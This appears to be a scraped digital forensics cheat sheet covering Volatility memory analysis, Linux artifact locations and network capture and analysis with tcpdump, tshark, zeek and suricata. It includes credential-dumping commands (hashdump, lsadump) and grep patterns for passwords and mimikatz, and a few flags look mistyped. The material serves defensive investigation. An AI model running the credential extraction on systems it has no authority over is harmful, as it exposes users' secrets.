# ── registry ──
python3 vol.py -f memory.raw windows.registry.hivelist
python3 vol.py -f memory.raw windows.registry.printkey --key "software\microsoft\windows\currentversion\run"

# ── credentials ──
# extract hashes from sam/system (lsass)
python3 vol.py -f memory.raw windows.hashdump

# lsa secrets
python3 vol.py -f memory.raw windows.lsadump

# ── strings ──
# extract all printable strings (useful for finding iocs)
strings -el memory.raw > strings_unicode.txt  # unicode
strings -a memory.raw > strings_ascii.txt     # ascii
grep -i 'password\|cmd.exe\|powershell\|mimikatz\|192\.168' strings_ascii.txt # linux process list
python3 vol.py -f memory.lime linux.pslist
python3 vol.py -f memory.lime linux.pstree
python3 vol.py -f memory.lime linux.psscan

# network connections
python3 vol.py -f memory.lime linux.netstat

# bash history from memory
python3 vol.py -f memory.lime linux.bash

# environment variables per process
python3 vol.py -f memory.lime linux.envars

# loaded kernel modules
python3 vol.py -f memory.lime linux.lsmod

# check for hidden kernel modules (rootkits)
python3 vol.py -f memory.lime linux.check_modules

# files mapped into memory
python3 vol.py -f memory.lime linux.maps --pid 1234

# dump process
python3 vol.py -f memory.lime linux.dumpfiles --pid 1234 linux forensic artifacts # ── log files ──
/var/log/auth.log          # ssh logins, sudo usage, pam events (debian/ubuntu)
/var/log/secure            # same but rhel/centos
/var/log/syslog            # general system events
/var/log/kern.log          # kernel messages
/var/log/apache2/          # web server logs
/var/log/nginx/            # nginx logs
/var/log/mysql/            # mysql logs
/var/log/cron              # cron job execution
/var/log/wtmp              # binary login records (read with 'last')
/var/log/btmp              # failed login attempts (read with 'lastb')
/var/log/lastlog           # last login per user (read with 'lastlog')
/run/utmp                  # currently logged-in users (read with 'who'/'w')

# ── bash history ──
~/.bash_history            # command history (may be disabled/cleared by attacker)
~/.zsh_history
/root/.bash_history        # root history — gold mine if attacker used root

# history is written on session exit — check memory for in-session commands

# ── cron jobs ──
/etc/crontab
/etc/cron.d/
/var/spool/cron/crontabs/  # per-user cron (read with 'crontab -l -u <user>')
/etc/cron.daily/
/etc/cron.hourly/

# ── persistence locations ──
/etc/rc.local
/etc/init.d/
/etc/systemd/system/       # systemd service units
/etc/profile.d/
~/.bashrc, ~/.bash_profile, ~/.profile
~/.config/autostart/       # desktop autostart
/etc/ld.so.preload         # ld_preload rootkit indicator

# ── recently modified files ──
find / -mtime -7 -type f 2>/dev/null | grep -v '/proc\|/sys'
find /tmp /var/tmp /dev/shm -type f 2>/dev/null   # malware drop zones
find / -perm -4000 -type f 2>/dev/null            # suid files
find / -perm -2000 -type f 2>/dev/null            # sgid files

# ── ssh artifacts ──
~/.ssh/authorized_keys     # backdoor if attacker added their key
~/.ssh/known_hosts         # systems this user has connected to
/var/log/auth.log          # grep for 'accepted\|failed'

# ── network ──
ss -tnlp                   # listening ports
ss -tnp                    # all connections
cat /proc/net/tcp          # raw tcp table
cat /proc/net/tcp6         # ipv6
arp -n                     # arp cache
ip route                   # routing table network forensics network forensics analyses captured traffic (pcap files) and log data to reconstruct what happened on the wire. # tcpdump — capture to file
tcpdump -i eth0 -w /evidence/capture.pcap
tcpdump -i any -w /evidence/all.pcap
tcpdump -i eth0 host 192.168.1.10 -w /evidence/host.pcap
tcpdump -i eth0 port 443 -w /evidence/https.pcap

# capture with size/time rolling
tcpdump -i eth0 -c 100 -w 10 -w /evidence/rolling.pcap  # 10 x 100mb files

# wireshark
wireshark /evidence/capture.pcap

# tshark (cli wireshark)
tshark -r capture.pcap -y 'http.request' -t fields -e ip.src -e http.host -e http.request.uri
tshark -r capture.pcap -y 'dns' -t fields -e ip.src -e dns.qry.name
tshark -r capture.pcap -y 'smtp or pop or imap' -w /evidence/email_traffic.pcap

# extract http objects
tshark -r capture.pcap --export-objects http,/evidence/http_objects/

# follow tcp stream
tshark -r capture.pcap -qz follow,tcp,ascii,0 # networkminer (linux via mono)
mono networkminer.exe /evidence/capture.pcap
# automatically extracts: credentials, files, sessions, dns, images

# zeek (formerly bro) — generates structured logs from pcap
zeek -r /evidence/capture.pcap
# generates: conn.log, dns.log, http.log, ssl.log, files.log, etc.

# analyse zeek logs
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration bytes_orig
cat http.log | zeek-cut ts id.orig_h host uri user_agent
cat dns.log | zeek-cut query answers qtype_name
cat files.log | zeek-cut mime_type filename sha256

# detect beaconing (regular intervals = c2)
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p duration | sort -k4 | awk '{print $2, $3}' | sort | uniq -c | sort -rn

# suricata — ids/ips against pcap
suricata -r /evidence/capture.pcap -l /evidence/suricata_logs/
cat /evidence/suricata_logs/fast.log   # alerts
cat /evidence/suricata_logs/eve.json | jq '.alert' | grep -v null

# ngrep — grep for content in pcap
ngrep -q -i capture.pcap 'password\|pass\|login'
ngrep -q -i capture.pcap '' 'host 192.168.1.10' timeline analysis timeline analysis correlates events from multiple sources into chronological order to reconstruct exactly what happened and when. this is where forensic investigations come together. # plaso (log2timeline) — comprehensive timeline tool

# workflow:
# 1. new case -> enter case info
# 2. add data source -> select disk image / directory / local disk
